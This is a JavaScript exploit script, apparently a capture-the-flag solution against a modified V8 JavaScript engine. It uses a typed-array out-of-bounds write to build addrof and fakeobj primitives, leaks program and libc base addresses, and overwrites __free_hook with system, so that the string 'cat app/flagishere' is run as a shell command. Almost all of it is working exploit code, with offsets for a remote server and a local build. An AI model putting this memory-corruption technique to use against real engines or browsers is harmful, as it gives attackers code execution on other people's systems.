//free_hook to system
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function ftoi_32(val){
	f64_buf[0] = val;
	return u64_buf[0];
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

function itof_32(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    return f64_buf[0];
}



var to_overflow = new Array();

to_overflow.push(new Uint32Array(0x4));
var temp_obj = {"A":1};
var fl_arr = [1.1, 1.2, 1.3, 1.4];
to_overflow.push([temp_obj]);
to_overflow.push(fl_arr);
to_overflow.push(new Uint32Array(0x10));


// %DebugPrint(to_overflow[0]);
// %DebugPrint(to_overflow[1]);
// %DebugPrint(to_overflow[2]);
// %DebugPrint(to_overflow[3]);

to_overflow[0].fill(0x400,12,13);

base = to_overflow[0][15];

float_map_idx = 42
obj_arr_map_idx = 49

float_map = to_overflow[0][float_map_idx];

obj_arr_map = to_overflow[0][obj_arr_map_idx];
uintlast_element_idx = 85
uintlast_map_idx = 83

uint_map = to_overflow[0][uintlast_map_idx];

function addrof(in_obj){
	to_overflow[1][0] = in_obj;
	to_overflow[0][obj_arr_map_idx] = float_map;
	let addr = to_overflow[1][0];
	to_overflow[0][obj_arr_map_idx] = obj_arr_map;
	return ftoi_32(addr);
}

function fakeobj(addr){
	to_overflow[2][0] = itof_32(addr);
	to_overflow[0][float_map_idx] = obj_arr_map;
	let fake = to_overflow[2][0];
	to_overflow[0][float_map_idx] = float_map;
	return fake;
}

var arb_rw_arr = new Uint32Array(0x10);

console.log("[+] Controlled float array: 0x" + addrof(arb_rw_arr).toString(16));
// arb_rw_arr.fill(0x400,12,13);


// function arb_read(addr){
// 	if (addr % 2n == 0){
// 		addr += 1n;
// 	}

// 	let fake = fakeobj(addrof(arb_rw_arr) - 0x20);
// 	arb_rw_arr[2] = itof_32

// %DebugPrint(to_overflow[0]);
// %DebugPrint(to_overflow[1]);
// %DebugPrint(to_overflow[2]);
// %DebugPrint(to_overflow[3]);
// %DebugPrint(arb_rw_arr);

// }
// gc();
// var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
// var wasm_mod = new WebAssembly.Module(wasm_code);
// var wasm_instance = new WebAssembly.Instance(wasm_mod);
// var f = wasm_instance.exports.main;

// console.log("0x"+addrof(wasm_instance).toString(16));
// wasm_addr_32 = addrof(wasm_instance);
// arb_rw_arr.fill(0x400,12,13);
// arb_rw_arr.fill(wasm_addr_32+0x60,18,19);
// arb_rw_arr.fill(wasm_addr_32+0x60,28,29);
// // %DebugPrint(arb_rw_arr);
// // to_overflow[0][uintlast_element_idx] = wasm_addr_32+0x50;

// wasm_addr = BigInt(arb_rw_arr[0]) + (BigInt(arb_rw_arr[1]) << 32n);
// console.log("0x" + wasm_addr.toString(16));

var last_over = new Array();
last_over.push(new Uint32Array(0x4));
last_over.push(new Uint32Array(0x4));
last_over.push(new Uint32Array(0x4));

// f();

last_over[0].fill(0x400,12,13);
addrof_arb = addrof(arb_rw_arr);
base = addrof_arb - 0x36e4 ;
console.log(base.toString(16));

base = base - (base & 0xfff) + 0x1;

last_over[0][51] = base;
last_over[0][47] = 0x40;
// last_over[1].fill(0x400,12,13);
heap_addr = BigInt(last_over[1][14]) + (BigInt(last_over[1][15]) << 32n);
console.log(heap_addr.toString(16));

sm = last_over[1][15];
lg = last_over[1][14] - 0x8 + 0x1;
last_over[0][50] = sm;
last_over[0][51] = lg;

pie_leak = BigInt(last_over[1][0]) + (BigInt(last_over[1][1]) << 32n);
console.log(pie_leak.toString(16));

pie_base = pie_leak - BigInt(21304328);
console.log(pie_base.toString(16));

sm = last_over[1][1];
lg = last_over[1][0] - 21304328 + 0x1468d40 - 0x8 + 0x1;
last_over[0][50] = sm;
last_over[0][51] = lg;

libc_leak = BigInt(last_over[1][0]) + (BigInt(last_over[1][1]) << 32n);
console.log("puts " + libc_leak.toString(16));

libc_leak = BigInt(last_over[1][2]) + (BigInt(last_over[1][3]) << 32n);
console.log("strlen " + libc_leak.toString(16));

libc_leak = BigInt(last_over[1][4]) + (BigInt(last_over[1][5]) << 32n);
console.log("printf " + libc_leak.toString(16));
//server
puts_offset = 0x083cc0;
free_hook_offset = 0x1e75a8;
system_offset = 0x052fd0;

//local
// puts_offset = 0x809c0;
// free_hook_offset = 0x3ed8e8;
// system_offset = 0x4f440;

libc_base = BigInt(last_over[1][0] - puts_offset) + (BigInt(last_over[1][1]) << 32n);
console.log("libc_base : " + libc_base.toString(16));



sm = last_over[1][1];
lg = last_over[1][0] - puts_offset + free_hook_offset - 0x8 + 0x1;
save = last_over[1][0]
last_over[0][50] = sm;
last_over[0][51] = lg;



sys = save - puts_offset + system_offset;

last_over[1][0] = sys;
last_over[1][1] = sm;

console.log("cat app/flagishere");
